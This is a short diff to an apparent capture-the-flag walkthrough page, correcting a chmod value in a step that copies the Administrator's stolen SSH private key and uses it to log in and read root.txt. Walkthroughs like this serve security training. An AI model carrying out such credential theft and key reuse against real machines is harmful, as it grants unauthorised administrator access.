@@ -441,7 +441,7 @@ ls /c/Users/Administrator/.ssh
 # found id_rsa</code></pre>
       <h3>8) Retrieve Administrator private key &amp; use it (lab-only)</h3>
       <pre><code># Copy id_rsa securely to attacker
-chmod 605 id_rsa
+chmod 600 id_rsa
 ssh -i id_rsa administrator@TARGET_IP</code></pre>
       <p>Authenticated as Administrator; retrieved <code>root.txt</code> from <code>C:\Users\Administrator\Desktop</code>.</p>
       <hr>
